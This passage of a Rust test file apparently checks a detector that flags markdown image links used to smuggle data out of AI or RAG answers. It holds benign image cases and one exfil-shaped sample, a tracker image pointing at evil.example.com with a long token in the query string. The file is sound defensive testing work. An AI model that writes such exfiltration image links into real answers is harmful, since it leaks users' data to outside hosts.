...
#[test]
fn benign_markdown_image_is_not_flagged() {
    // A plain markdown image to a normal-looking URL (e.g. a docs bot
    // or RAG target citing a diagram) must not be flagged.
    assert!(
        run_with("Here's a diagram: ![architecture](https://docs.example.com/diagram.png)")
            .is_empty()
    );
}

#[test]
fn benign_markdown_image_with_short_query_is_not_flagged() {
    assert!(run_with("![chart](https://example.com/chart.png?v=2)").is_empty());
}

#[test]
fn flags_raw_img_html_tag() {
    assert_eq!(
        run_with(r#"<img src="https://example.com/x.png">"#).len(),
        1
    );
}

#[test]
fn flags_markdown_image_with_exfil_shaped_url() {
    let long_token = "a".repeat(30);
    let answer = format!("![tracker](https://evil.example.com/x?token={long_token})");
    assert_eq!(run_with(&answer).len(), 1);
}
